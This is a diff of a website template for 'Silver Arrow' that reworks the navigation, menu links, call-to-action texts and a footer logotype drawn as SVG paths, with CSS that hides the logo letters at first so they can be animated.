@@ -63,6 +63,38 @@ html.lenis,html.lenis body{height:auto}.lenis.lenis-smooth{scroll-behavior:auto 
 }
 </style>
   <style>
+/* header logotype initial states */
+#silver-a,
+#silver-b,
+#silver-c,
+#silver-d,
+#silver-e,
+#silver-f,
+#silver-g,
+#silver-h,
+#silver-i,
+#silver-j,
+#silver-k {
+  opacity: 0;
+}
+</style>
+  <style>
+/* header logotype initial states */
+#footer-silver-a,
+#footer-silver-b,
+#footer-silver-c,
+#footer-silver-d,
+#footer-silver-e,
+#footer-silver-f,
+#footer-silver-g,
+#footer-silver-h,
+#footer-silver-i,
+#footer-silver-j,
+#footer-silver-k {
+  opacity: 0;
+}
+</style>
+  <style>
 /* text highlight overrides */
 ::selection{background-color:#F28520}
 </style>
@@ -238,15 +270,11 @@ a {
     <nav data-id="target" class="nav">
       <div class="container is-nav">
         <div class="nav__container">
-          <div class="nab__logo is-dark w-embed"><svg title="Silver Arrow SA" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1373.62 251.32">
-              <a href="{{ links.2f }}">
-                <path transform="rotate(90 686.81 125.66)" style="fill:transparent;z-index:99;" d="M561.15-561.15h251.32V812.47H561.15z"></path>
-              </a>
-              <g style="fill:currentColor;pointer-events: none;">
-                <path d="M259.87 162.92c1.81 3.5 4.2 6.32 7.2 8.48s6.51 3.76 10.55 4.81c4.04 1.02 8.22 1.54 12.53 1.54 2.93 0 6.06-.23 9.4-.73 3.35-.47 6.48-1.43 9.4-2.8 2.93-1.4 5.36-3.32 7.31-5.77 1.95-2.42 2.93-5.54 2.93-9.29 0-4.02-1.3-7.28-3.86-9.79-2.58-2.53-5.96-4.6-10.14-6.29-4.17-1.66-8.9-3.12-14.19-4.37a397.82 397.82 0 0 1-16.08-4.17c-5.58-1.4-11-3.12-16.3-5.13-5.29-2.01-10.02-4.63-14.19-7.84-4.18-3.21-7.56-7.2-10.14-12-2.58-4.81-3.86-10.61-3.86-17.45 0-7.63 1.63-14.31 4.91-19.93 3.26-5.65 7.55-10.34 12.85-14.1 5.29-3.76 11.28-6.53 17.96-8.36 6.67-1.81 13.36-2.71 20.05-2.71 7.79 0 15.28.87 22.45 2.62s13.53 4.55 19.11 8.45c5.57 3.9 9.98 8.89 13.26 14.95 3.26 6.03 4.91 13.4 4.91 22.03h-31.75c-.28-4.46-1.22-8.16-2.83-11.07s-3.72-5.22-6.37-6.91c-2.65-1.66-5.67-2.86-9.09-3.53-3.41-.7-7.12-1.05-11.17-1.05-2.64 0-5.29.26-7.93.82-2.65.58-5.06 1.54-7.21 2.94-2.16 1.4-3.93 3.12-5.32 5.22-1.4 2.1-2.1 4.72-2.1 7.93 0 2.94.55 5.3 1.68 7.11 1.11 1.81 3.31 3.5 6.57 5.01 3.28 1.54 7.81 3.06 13.58 4.6 5.78 1.52 13.33 3.47 22.67 5.83 2.78.58 6.64 1.57 11.58 3.03 4.95 1.49 9.85 3.82 14.73 7.02 4.88 3.18 9.09 7.46 12.63 12.82 3.55 5.36 5.33 12.24 5.33 20.57 0 6.85-1.33 13.17-3.96 19.03-2.65 5.83-6.59 10.9-11.8 15.12-5.23 4.25-11.7 7.58-19.43 9.94-7.72 2.36-16.67 3.55-26.84 3.55-8.22 0-16.19-1.02-23.91-3.03-7.74-2.01-14.55-5.19-20.47-9.5-5.93-4.31-10.62-9.82-14.1-16.52-3.48-6.67-5.16-14.6-5.01-23.81h31.75c0 5.01.9 9.27 2.72 12.73ZM368.04 75.01V50.56h29.66v24.45h-29.66ZM397.7 91.7v107.98h-29.66V91.7h29.66ZM451.59 50.56v149.13h-29.66V50.56h29.66ZM501.72 199.69 464.76 91.71h31.12l22.76 73.72h.42l22.77-73.72h29.44l-36.55 107.98h-33ZM615.34 173.78c4.46 4.31 10.87 6.47 19.22 6.47 5.99 0 11.15-1.49 15.46-4.49 4.31-2.97 6.96-6.15 7.94-9.5h26.11c-4.18 12.97-10.59 22.2-19.22 27.77-8.64 5.59-19.08 8.36-31.34 8.36-8.49 0-16.14-1.34-22.97-4.08-6.82-2.71-12.6-6.56-17.32-11.57-4.73-5.01-8.39-11.01-10.97-17.98-2.58-6.96-3.86-14.63-3.86-22.96s1.31-15.59 3.96-22.55 6.41-13 11.28-18.09c4.88-5.07 10.69-9.06 17.44-12 6.76-2.91 14.23-4.37 22.45-4.37 9.19 0 17.21 1.78 24.02 5.33 6.82 3.53 12.43 8.3 16.81 14.31 4.39 5.97 7.55 12.79 9.5 20.45 1.95 7.66 2.65 15.68 2.1 24.01h-77.91c.42 9.62 2.86 16.58 7.31 20.89Zm33.53-56.81c-3.55-3.88-8.95-5.83-16.19-5.83-4.73 0-8.67.79-11.8 2.39-3.13 1.6-5.64 3.58-7.52 5.94-1.88 2.39-3.21 4.9-3.96 7.55-.77 2.62-1.22 5.01-1.37 7.08h48.25c-1.4-7.52-3.86-13.23-7.42-17.13ZM731.69 91.7v20.05h.41c1.4-3.32 3.28-6.44 5.64-9.29a37.45 37.45 0 0 1 8.14-7.31c3.06-2.01 6.34-3.58 9.82-4.69 3.48-1.11 7.11-1.66 10.87-1.66 1.94 0 4.09.35 6.47 1.05v27.56c-1.4-.29-3.06-.52-5.01-.73s-3.83-.32-5.64-.32c-5.43 0-10.02.9-13.78 2.71s-6.79 4.28-9.09 7.43c-2.3 3.12-3.93 6.79-4.91 10.96s-1.46 8.71-1.46 13.58v48.66h-29.66V91.72h28.2ZM862.22 50.56l55.77 149.13h-34.05l-11.28-33.22h-55.77l-11.7 33.22h-33l56.4-149.13h33.62Zm1.88 91.49-18.79-54.72h-.42l-19.42 54.72h38.64ZM956 91.7v20.05h.41c1.4-3.32 3.28-6.44 5.64-9.29a37.45 37.45 0 0 1 8.14-7.31c3.06-2.01 6.34-3.58 9.82-4.69 3.48-1.11 7.11-1.66 10.87-1.66 1.94 0 4.09.35 6.47 1.05v27.56c-1.4-.29-3.06-.52-5.01-.73s-3.83-.32-5.64-.32c-5.43 0-10.02.9-13.78 2.71s-6.79 4.28-9.09 7.43c-2.3 3.12-3.93 6.79-4.91 10.96-.98 4.17-1.46 8.71-1.46 13.58v48.66H927.8V91.72H956ZM1037.25 91.7v20.05h.41c1.4-3.32 3.28-6.44 5.64-9.29a37.45 37.45 0 0 1 8.14-7.31c3.06-2.01 6.34-3.58 9.82-4.69 3.48-1.11 7.11-1.66 10.87-1.66 1.94 0 4.09.35 6.47 1.05v27.56c-1.4-.29-3.06-.52-5.01-.73s-3.83-.32-5.64-.32c-5.43 0-10.02.9-13.78 2.71s-6.79 4.28-9.09 7.43c-2.3 3.12-3.93 6.79-4.91 10.96-.98 4.17-1.46 8.71-1.46 13.58v48.66h-29.66V91.72h28.2ZM1087.16 122.3c2.65-7.02 6.41-13.02 11.28-17.95 4.88-4.95 10.72-8.77 17.56-11.48 6.82-2.74 14.47-4.08 22.96-4.08s16.2 1.34 23.09 4.08c6.89 2.71 12.76 6.53 17.64 11.48 4.87 4.92 8.62 10.93 11.28 17.95 2.65 7.05 3.98 14.86 3.98 23.51s-1.33 16.43-3.98 23.37c-2.65 6.96-6.41 12.94-11.28 17.86-4.88 4.95-10.75 8.74-17.64 11.39-6.89 2.65-14.6 3.96-23.09 3.96s-16.14-1.31-22.96-3.96c-6.83-2.65-12.67-6.44-17.56-11.39-4.87-4.92-8.62-10.9-11.28-17.86-2.65-6.93-3.96-14.74-3.96-23.37s1.31-16.46 3.96-23.51Zm26.94 36.13c.84 4.11 2.27 7.81 4.28 11.07 2.03 3.29 4.71 5.89 8.04 7.84 3.35 1.95 7.52 2.91 12.53 2.91s9.24-.96 12.65-2.91c3.41-1.95 6.12-4.55 8.14-7.84 2.01-3.26 3.44-6.96 4.28-11.07.83-4.11 1.25-8.3 1.25-12.62s-.42-8.57-1.25-12.76c-.84-4.17-2.27-7.87-4.28-11.04-2.03-3.21-4.73-5.83-8.14-7.84-3.41-2.04-7.62-3.03-12.65-3.03s-9.18.99-12.53 3.03c-3.34 2.01-6.02 4.63-8.04 7.84-2.01 3.18-3.44 6.88-4.28 11.04-.83 4.2-1.25 8.45-1.25 12.76s.42 8.51 1.25 12.62ZM1307.09 199.69l-19.22-72.46h-.42l-18.37 72.46h-30.71l-34.25-107.98h31.32l19.84 73.31h.42l17.96-73.31h28.82l18.39 73.11h.42l19.83-73.11h30.49l-34.03 107.98h-30.49ZM107.37 197.34c-3.97 0-7.93-1.51-10.96-4.54l-74.48-74.47c-26.58-26.58-26.58-69.82 0-96.4s69.82-26.58 96.4 0l37.24 37.24c6.05 6.05 6.05 15.87 0 21.92-6.05 6.05-15.87 6.05-21.92 0L96.41 43.85c-14.49-14.49-38.07-14.49-52.56 0-14.49 14.49-14.49 38.07 0 52.56l74.48 74.48c6.05 6.05 6.05 15.87 0 21.92a15.437 15.437 0 0 1-10.96 4.54Z"></path>
-                <path class="cls-1" d="M106.7 249.32c-18.21 0-35.32-7.09-48.2-19.96l-37.24-37.24c-6.05-6.05-6.05-15.87 0-21.92 6.05-6.05 15.87-6.05 21.92 0l37.24 37.24c7.02 7.02 16.35 10.88 26.28 10.88s19.26-3.87 26.28-10.88c7.02-7.02 10.88-16.35 10.88-26.28s-3.87-19.26-10.88-26.28L58.5 80.41c-6.05-6.05-6.05-15.87 0-21.92 6.05-6.05 15.87-6.05 21.92 0l74.48 74.48c12.88 12.87 19.96 29.99 19.96 48.2s-7.09 35.32-19.96 48.2c-12.87 12.87-29.99 19.96-48.2 19.96Z"></path>
-              </g>
-            </svg></div>
+          <a aria-label="link" href="{{ links.2f }}" class="goback w-inline-block">
+            <div class="icon__mini w-embed"><svg width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120">
+                <path d="M106.36 0H13.64C6.1 0 0 6.1 0 13.64c0 7.53 6.1 13.64 13.64 13.64h59.81L3.99 96.72c-5.32 5.32-5.32 13.96 0 19.28s13.96 5.32 19.28 0l69.46-69.45v59.81c0 7.53 6.1 13.64 13.64 13.64 7.53 0 13.64-6.1 13.64-13.64V13.64C120 6.1 113.9 0 106.36 0Z" style="fill:currentColor"></path>
+              </svg></div>
+          </a>
           <div class="nav__desktop-wrap">
             <div class="nav__desktop-ctas">
               <a id="w-node-_6be5e0a1-a1f9-62d4-dd7b-b0c6dcdb33ac-c49e16ad" href="{{ links.710c0232 }}" class="nav__cta-wrap w-inline-block">
@@ -265,22 +293,35 @@ a {
             </svg></div>
           <div data-id="menu" class="nav__menu">
             <div id="w-node-adf1df57-a4a8-9abe-a5cd-854d3cd85bd4-3cd85bd3" class="nav__cta-wrappper">
+              <a href="{{ links.2f }}" data-id="navbar-link" class="nav__link is-long w-inline-block">
+                <div class="nav__link-text">{{ texts.2268ff }}</div>
+                <div class="arrow-nav w-embed"><svg width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 137.32 137.32">
+                    <defs>
+                      <style>
+        .nsvs {
+          vector-effect: non-scaling-stroke;
+        }
+      </style>
+                    </defs>
+                    <path id="pointing-arrow-path" class="nsvs" fill="currentColor" stroke="currentColor" stroke-width=".5" d="M136.75 14.47c-.02-.22-.06-.43-.09-.65-.04-.28-.07-.57-.13-.85-.05-.25-.12-.5-.18-.75-.06-.24-.11-.48-.19-.72-.08-.25-.17-.49-.25-.73-.08-.23-.16-.47-.26-.7-.09-.23-.21-.45-.31-.67-.11-.24-.22-.47-.34-.7-.12-.22-.25-.42-.37-.63-.13-.22-.26-.45-.41-.67-.16-.24-.33-.46-.5-.68-.13-.18-.26-.36-.4-.53-.65-.79-1.37-1.52-2.17-2.17-.17-.14-.36-.27-.53-.4-.23-.17-.45-.34-.68-.5-.22-.15-.45-.27-.67-.41-.21-.13-.42-.26-.63-.37-.23-.12-.47-.23-.7-.34-.22-.11-.44-.22-.67-.31-.23-.1-.47-.17-.7-.26-.24-.09-.48-.18-.73-.26-.24-.07-.48-.12-.72-.18-.25-.06-.5-.13-.75-.18-.28-.06-.56-.09-.85-.13-.22-.03-.43-.07-.65-.09-.51-.05-1.02-.08-1.54-.08H16C7.44.5.5 7.44.5 16S7.44 31.5 16 31.5h67.9L5.04 110.36c-6.05 6.05-6.05 15.87 0 21.92 3.03 3.03 6.99 4.54 10.96 4.54s7.93-1.51 10.96-4.54l78.86-78.86v67.9c0 8.56 6.94 15.5 15.5 15.5s15.5-6.94 15.5-15.5V16c0-.51-.03-1.03-.08-1.54Z"></path>
+                  </svg></div>
+              </a>
               <div class="menu__links-categ">
-                <a href="{{ links.-5b0dcf13 }}" data-id="navbar-link" class="nav__link w-inline-block">
+                <a href="{{ links.-5b0dcf13 }}" data-id="navbar-link" class="nav__link left-align w-inline-block">
                   <div class="nav__circle"></div>
                   <div class="nav__link-text">{{ texts.588acfb3 }}</div>
                 </a>
-                <a href="{{ links.-43bd562b }}" data-id="navbar-link" class="nav__link w-inline-block">
+                <a href="{{ links.-43bd562b }}" data-id="navbar-link" class="nav__link left-align w-inline-block">
                   <div data-color="digital-assets" class="nav__circle"></div>
                   <div class="nav__link-text">{{ texts.6a843eb5 }}</div>
                 </a>
-                <a href="{{ links.71cdd7a5 }}" data-id="navbar-link" class="nav__link w-inline-block">
-                  <div data-color="institutional-services" class="nav__circle"></div>
-                  <div class="nav__link-text">{{ texts.-49fa73c5 }}</div>
-                </a>
-                <a href="{{ links.-43fcb0f8 }}" data-id="navbar-link" class="nav__link w-inline-block">
+                <a href="{{ links.-4ab625c7 }}" data-id="navbar-link" class="nav__link left-align w-inline-block">
                   <div data-color="fund" class="nav__circle"></div>
-                  <div class="nav__link-text">{{ texts.2196e5 }}</div>
+                  <div class="nav__link-text">{{ texts.5a50c314 }}</div>
+                </a>
+                <a href="{{ links.-3b99659d }}" data-id="navbar-link" class="nav__link left-align w-inline-block">
+                  <div data-color="institutional-services" class="nav__circle"></div>
+                  <div class="nav__link-text">{{ texts.411462e }}</div>
                 </a>
               </div>
               <div class="menu__links-categ">
@@ -323,8 +364,8 @@ a {
                       <path id="pointing-arrow-path" class="nsvs" fill="currentColor" stroke="currentColor" stroke-width=".5" d="M136.75 14.47c-.02-.22-.06-.43-.09-.65-.04-.28-.07-.57-.13-.85-.05-.25-.12-.5-.18-.75-.06-.24-.11-.48-.19-.72-.08-.25-.17-.49-.25-.73-.08-.23-.16-.47-.26-.7-.09-.23-.21-.45-.31-.67-.11-.24-.22-.47-.34-.7-.12-.22-.25-.42-.37-.63-.13-.22-.26-.45-.41-.67-.16-.24-.33-.46-.5-.68-.13-.18-.26-.36-.4-.53-.65-.79-1.37-1.52-2.17-2.17-.17-.14-.36-.27-.53-.4-.23-.17-.45-.34-.68-.5-.22-.15-.45-.27-.67-.41-.21-.13-.42-.26-.63-.37-.23-.12-.47-.23-.7-.34-.22-.11-.44-.22-.67-.31-.23-.1-.47-.17-.7-.26-.24-.09-.48-.18-.73-.26-.24-.07-.48-.12-.72-.18-.25-.06-.5-.13-.75-.18-.28-.06-.56-.09-.85-.13-.22-.03-.43-.07-.65-.09-.51-.05-1.02-.08-1.54-.08H16C7.44.5.5 7.44.5 16S7.44 31.5 16 31.5h67.9L5.04 110.36c-6.05 6.05-6.05 15.87 0 21.92 3.03 3.03 6.99 4.54 10.96 4.54s7.93-1.51 10.96-4.54l78.86-78.86v67.9c0 8.56 6.94 15.5 15.5 15.5s15.5-6.94 15.5-15.5V16c0-.51-.03-1.03-.08-1.54Z"></path>
                     </svg></div>
                 </a>
-                <a href="{{ links.23 }}" data-id="navbar-link" class="nav__link soon w-inline-block">
-                  <div class="nav__link-text">{{ texts.4183f794 }}<sup class="exponent">{{ texts.26ed3b }}</sup></div>
+                <a href="{{ links.3713d979 }}" data-id="navbar-link" class="nav__link w-inline-block">
+                  <div class="nav__link-text">{{ texts.23254a0c }}</div>
                   <div class="arrow-nav w-embed"><svg width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 137.32 137.32">
                       <defs>
                         <style>
@@ -357,15 +398,6 @@ a {
               </a>
               <a href="{{ links.-d4fd732 }}" target="_blank" class="footer__link-wrap w-inline-block">
                 <div class="nav__cta-text is-menu no-padding">{{ texts.79ceadde }}</div>
-                <div class="heart w-embed">
-                  <style>
-/* breathing heart animation */
-:root{--heart-size:6px;--pulse-duration:800ms;--big-pulse-duration:400ms}.heart{animation:pulse var(--pulse-duration) infinite}.heart__wrap:hover .heart{animation:bigPulse var(--big-pulse-duration) infinite}@keyframes pulse{0%{transform:scale(1)}15%{transform:scale(1.2)}25%{transform:scale(1)}75%{transform:scale(1.3)}}@keyframes bigPulse{0%,100%{transform:scale(1)}50%{transform:scale(1.55)}}
-</style>
-                  <svg title="heart" width="100%" height="100%" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M2 9.137C2 14 6.02 16.591 8.962 18.911 10 19.729 11 20.5 12 20.5s2-.77 3.038-1.59C17.981 16.592 22 14 22 9.138c0-4.863-5.5-8.312-10-3.636C7.5.825 2 4.274 2 9.137Z" fill="currentColor"></path>
-                  </svg>
-                </div>
                 <div class="nav__cta-text is-menu no-padding">{{ texts.-67104443 }}</div>
               </a>
             </div>
@@ -457,7 +489,7 @@ a {
                 <div style="-webkit-transform:translate3d(0, 25%, 0) scale3d(1, 1, 1) rotateX(0) rotateY(0) rotateZ(0) skew(0, 0);-moz-transform:translate3d(0, 25%, 0) scale3d(1, 1, 1) rotateX(0) rotateY(0) rotateZ(0) skew(0, 0);-ms-transform:translate3d(0, 25%, 0) scale3d(1, 1, 1) rotateX(0) rotateY(0) rotateZ(0) skew(0, 0);transform:translate3d(0, 25%, 0) scale3d(1, 1, 1) rotateX(0) rotateY(0) rotateZ(0) skew(0, 0);opacity:0" class="header__paragraph tight"><span class="serif-italic">{{ texts.-2222aed2 }}</span>{{ texts.-294fa0d3 }}</div>
                 <div class="magnet">
                   <a data-color="dark" style="-webkit-transform:translate3d(0, 50%, 0) scale3d(1, 1, 1) rotateX(0) rotateY(0) rotateZ(0) skew(0, 0);-moz-transform:translate3d(0, 50%, 0) scale3d(1, 1, 1) rotateX(0) rotateY(0) rotateZ(0) skew(0, 0);-ms-transform:translate3d(0, 50%, 0) scale3d(1, 1, 1) rotateX(0) rotateY(0) rotateZ(0) skew(0, 0);transform:translate3d(0, 50%, 0) scale3d(1, 1, 1) rotateX(0) rotateY(0) rotateZ(0) skew(0, 0);opacity:0" href="{{ links.6b090711 }}" class="cta__btn w-inline-block">
-                    <div>{{ texts.-5f8cfd1a }}</div>
+                    <div>{{ texts.1422dc09 }}</div>
                     <div class="icon__mini w-embed"><svg width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120">
                         <path d="M106.36 0H13.64C6.1 0 0 6.1 0 13.64c0 7.53 6.1 13.64 13.64 13.64h59.81L3.99 96.72c-5.32 5.32-5.32 13.96 0 19.28s13.96 5.32 19.28 0l69.46-69.45v59.81c0 7.53 6.1 13.64 13.64 13.64 7.53 0 13.64-6.1 13.64-13.64V13.64C120 6.1 113.9 0 106.36 0Z" style="fill:currentColor"></path>
                       </svg></div>
@@ -474,7 +506,7 @@ a {
       <section id="intro" data-id="intro" class="section is-intro">
         <div class="container">
           <p data-reveal="true" data-id="reveal" class="intro__text">{{ texts.3a42146 }}</p>
-          <div class="div-block">
+          <div class="intro__subline">
             <p id="w-node-d8ba52f7-dcfa-89ed-3e85-d0737828f828-c49e16ad" class="paragraph">{{ texts.47bce475 }}</p>
           </div>
         </div>
@@ -582,7 +614,7 @@ a {
       <section data-id="quote" class="section is-overview">
         <div class="quote-img">
           <div data-id="quote" class="quote-img__quote">
-            <p data-reveal="true" class="heading light"><span class="serif-italic normal">{{ texts.3611dc4b }}</span>{{ texts.-730b80af }}<br></p>
+            <p data-reveal="true" class="heading light"><span class="serif-italic normal">{{ texts.1ccb8c8a }}</span>{{ texts.-3d57e290 }}<br></p>
           </div>
           <div id="w-node-e021be57-1112-60d7-fa3b-ee255a0fcda8-5a0fcd91" class="quote-img__img"><img src="{{ images.2a4dba0e.url }}" loading="lazy" alt="{{ images.2a4dba0e.alt | escape }}" sizes="(max-width: 767px) 100vw, 50vw" class="quote-img__midjourney">
             <div class="quote-img__arrow-outline w-embed"><!--  logotype quote start  -->
@@ -610,77 +642,104 @@ a {
               <div class="footer__cta-wrap">
                 <div class="magnet">
                   <a data-trigger="pointing-arrow" data-popup="trigger" data-color="dark" href="{{ links.23 }}" class="cta__btn w-inline-block">
-                    <div>{{ texts.-5230a9d2 }}</div>
+                    <div>{{ texts.28850a7f }}</div>
                     <div class="icon__mini w-embed"><svg width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120">
                         <path d="M106.36 0H13.64C6.1 0 0 6.1 0 13.64c0 7.53 6.1 13.64 13.64 13.64h59.81L3.99 96.72c-5.32 5.32-5.32 13.96 0 19.28s13.96 5.32 19.28 0l69.46-69.45v59.81c0 7.53 6.1 13.64 13.64 13.64 7.53 0 13.64-6.1 13.64-13.64V13.64C120 6.1 113.9 0 106.36 0Z" style="fill:currentColor"></path>
                       </svg></div>
                   </a>
                 </div>
-                <div class="footer__pointing-arrow w-embed"><svg id="pointing-arrow-svg" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 137.32 137.32">
+                <div class="footer__pointing-arrow-v2 w-embed"><svg id="pointing-arrow-svg" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1142.23 1142.23">
                     <defs>
                       <style>
-        .nsvs {
-          vector-effect: non-scaling-stroke;
-        }
-      </style>
+      .nsvs {
+        vector-effect: non-scaling-stroke;
+      }
+    </style>
                     </defs>
-                    <path id="pointing-arrow-path" class="nsvs" fill="transparent" stroke="black" stroke-width=".5" d="M136.75 14.47c-.02-.22-.06-.43-.09-.65-.04-.28-.07-.57-.13-.85-.05-.25-.12-.5-.18-.75-.06-.24-.11-.48-.19-.72-.08-.25-.17-.49-.25-.73-.08-.23-.16-.47-.26-.7-.09-.23-.21-.45-.31-.67-.11-.24-.22-.47-.34-.7-.12-.22-.25-.42-.37-.63-.13-.22-.26-.45-.41-.67-.16-.24-.33-.46-.5-.68-.13-.18-.26-.36-.4-.53-.65-.79-1.37-1.52-2.17-2.17-.17-.14-.36-.27-.53-.4-.23-.17-.45-.34-.68-.5-.22-.15-.45-.27-.67-.41-.21-.13-.42-.26-.63-.37-.23-.12-.47-.23-.7-.34-.22-.11-.44-.22-.67-.31-.23-.1-.47-.17-.7-.26-.24-.09-.48-.18-.73-.26-.24-.07-.48-.12-.72-.18-.25-.06-.5-.13-.75-.18-.28-.06-.56-.09-.85-.13-.22-.03-.43-.07-.65-.09-.51-.05-1.02-.08-1.54-.08H16C7.44.5.5 7.44.5 16S7.44 31.5 16 31.5h67.9L5.04 110.36c-6.05 6.05-6.05 15.87 0 21.92 3.03 3.03 6.99 4.54 10.96 4.54s7.93-1.51 10.96-4.54l78.86-78.86v67.9c0 8.56 6.94 15.5 15.5 15.5s15.5-6.94 15.5-15.5V16c0-.51-.03-1.03-.08-1.54Z"></path>
+                    <path id="pointing-arrow-path" class="nsvs" fill="transparent" stroke="black" stroke-width=".5" d="M985.18,35.29H157.06c-67.25,0-121.77,54.52-121.77,121.77s54.52,121.77,121.77,121.77h534.14L70.95,899.07c-47.55,47.55-47.55,124.65,0,172.21,47.55,47.55,124.65,47.55,172.21,0h0S863.41,451.04,863.41,451.04v534.14c0,67.25,54.52,121.77,121.77,121.77s121.77-54.52,121.77-121.77V157.06h0c0-67.25-54.52-121.77-121.77-121.77Z"></path>
                   </svg></div>
               </div>
             </div>
           </div>
           <div class="footer__logo-wrap">
+            <div data-id="sawm" class="hero__silverarrow-v2 w-embed"><svg id="logotype-footer" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 903.5 131.6">
+                <defs>
+                  <style>
+      .logotype-footer-group {
+        fill: transparent;
+        stroke-width: .5;
+        stroke: currentColor;
+      }
+      .nsvs {
+        vector-effect: non-scaling-stroke;
+      }
+    </style>
+                </defs>
+                <g class="logotype-footer-group">
+                  <path id="footer-silver-a" class="nsvs" d="M31.9,95.3c1.4,2.7,3.3,4.9,5.6,6.6,2.3,1.7,5.1,2.9,8.2,3.8,3.2.8,6.4,1.2,9.8,1.2s4.7-.2,7.3-.6c2.6-.4,5-1.1,7.3-2.2,2.3-1.1,4.2-2.6,5.7-4.5,1.5-1.9,2.3-4.3,2.3-7.2s-1-5.7-3-7.6c-2-2-4.6-3.6-7.9-4.9-3.2-1.3-6.9-2.4-11.1-3.4-4.1-1-8.3-2.1-12.5-3.2-4.3-1.1-8.6-2.4-12.7-4-4.1-1.6-7.8-3.6-11.1-6.1-3.3-2.5-5.9-5.6-7.9-9.4s-3-8.3-3-13.6,1.3-11.1,3.8-15.5c2.5-4.4,5.9-8.1,10-11,4.1-2.9,8.8-5.1,14-6.5,5.2-1.4,10.4-2.1,15.6-2.1s11.9.7,17.5,2c5.6,1.4,10.6,3.5,14.9,6.6,4.3,3,7.8,6.9,10.3,11.6,2.5,4.7,3.8,10.4,3.8,17.2h-24.7c-.2-3.5-.9-6.4-2.2-8.6s-2.9-4.1-5-5.4c-2.1-1.3-4.4-2.2-7.1-2.8-2.7-.5-5.5-.8-8.7-.8s-4.1.2-6.2.6c-2.1.5-3.9,1.2-5.6,2.3s-3.1,2.4-4.1,4.1c-1.1,1.6-1.6,3.7-1.6,6.2s.4,4.1,1.3,5.5c.9,1.4,2.6,2.7,5.1,3.9,2.6,1.2,6.1,2.4,10.6,3.6,4.5,1.2,10.4,2.7,17.7,4.5,2.2.5,5.2,1.2,9,2.4,3.9,1.2,7.7,3,11.5,5.5,3.8,2.5,7.1,5.8,9.8,10,2.8,4.2,4.2,9.5,4.2,16s-1,10.3-3.1,14.8c-2.1,4.5-5.1,8.5-9.2,11.8-4.1,3.3-9.1,5.9-15.2,7.7-6,1.8-13,2.8-20.9,2.8s-12.6-.8-18.6-2.4c-6-1.6-11.3-4-16-7.4s-8.3-7.7-11-12.9c-2.7-5.2-4-11.3-3.9-18.5h24.7c0,3.9.7,7.2,2.1,9.9h0Z"></path>
+                  <path id="footer-silver-b" class="nsvs" d="M116.2,26.8V7.8h23.1v19.1s-23.1,0-23.1,0ZM139.3,39.8v84.2h-23.1V39.8h23.1Z"></path>
+                  <path id="footer-silver-c" class="nsvs" d="M181.3,7.8v116.2h-23.1V7.8h23.1Z"></path>
+                  <path id="footer-silver-d" class="nsvs" d="M220.4,124l-28.8-84.2h24.3l17.7,57.5h.3l17.8-57.5h22.9l-28.5,84.2h-25.7Z"></path>
+                  <path id="footer-silver-e" class="nsvs" d="M309,103.8c3.5,3.4,8.5,5,15,5s8.7-1.2,12-3.5c3.4-2.3,5.4-4.8,6.2-7.4h20.4c-3.3,10.1-8.3,17.3-15,21.6-6.7,4.4-14.9,6.5-24.4,6.5s-12.6-1-17.9-3.2c-5.3-2.1-9.8-5.1-13.5-9-3.7-3.9-6.5-8.6-8.5-14-2-5.4-3-11.4-3-17.9s1-12.2,3.1-17.6,5-10.1,8.8-14.1c3.8-4,8.3-7.1,13.6-9.4,5.3-2.3,11.1-3.4,17.5-3.4s13.4,1.4,18.7,4.2c5.3,2.8,9.7,6.5,13.1,11.2,3.4,4.7,5.9,10,7.4,15.9s2.1,12.2,1.6,18.7h-60.7c.3,7.5,2.2,12.9,5.7,16.3h0ZM335.1,59.5c-2.8-3-7-4.5-12.6-4.5s-6.8.6-9.2,1.9-4.4,2.8-5.9,4.6c-1.5,1.9-2.5,3.8-3.1,5.9-.6,2-1,3.9-1.1,5.5h37.6c-1.1-5.9-3-10.3-5.8-13.3h0Z"></path>
+                  <path id="footer-silver-f" class="nsvs" d="M399.7,39.8v15.6h.3c1.1-2.6,2.6-5,4.4-7.2,1.9-2.2,4-4.1,6.4-5.7,2.4-1.6,4.9-2.8,7.6-3.7,2.7-.9,5.5-1.3,8.5-1.3s3.2.3,5,.8v21.5c-1.1-.2-2.4-.4-3.9-.6s-3-.2-4.4-.2c-4.2,0-7.8.7-10.7,2.1s-5.3,3.3-7.1,5.8c-1.8,2.4-3.1,5.3-3.8,8.5-.8,3.2-1.1,6.8-1.1,10.6v37.9h-23.1V39.8h22Z"></path>
+                  <path id="footer-silver-g" class="nsvs" d="M501.4,7.8l43.5,116.2h-26.5l-8.8-25.9h-43.5l-9.1,25.9h-25.7L475.2,7.8h26.2ZM502.9,79.1l-14.6-42.7h-.3l-15.1,42.7h30.1Z"></path>
+                  <path id="footer-silver-h" class="nsvs" d="M574.5,39.8v15.6h.3c1.1-2.6,2.6-5,4.4-7.2,1.8-2.2,4-4.1,6.3-5.7,2.4-1.6,4.9-2.8,7.7-3.7,2.7-.9,5.5-1.3,8.5-1.3s3.2.3,5,.8v21.5c-1.1-.2-2.4-.4-3.9-.6s-3-.2-4.4-.2c-4.2,0-7.8.7-10.7,2.1s-5.3,3.3-7.1,5.8c-1.8,2.4-3.1,5.3-3.8,8.5s-1.1,6.8-1.1,10.6v37.9h-23.1V39.8h22Z"></path>
+                  <path id="footer-silver-i" class="nsvs" d="M637.8,39.8v15.6h.3c1.1-2.6,2.6-5,4.4-7.2,1.8-2.2,4-4.1,6.3-5.7,2.4-1.6,4.9-2.8,7.7-3.7,2.7-.9,5.5-1.3,8.5-1.3s3.2.3,5,.8v21.5c-1.1-.2-2.4-.4-3.9-.6s-3-.2-4.4-.2c-4.2,0-7.8.7-10.7,2.1s-5.3,3.3-7.1,5.8c-1.8,2.4-3.1,5.3-3.8,8.5s-1.1,6.8-1.1,10.6v37.9h-23.1V39.8h22Z"></path>
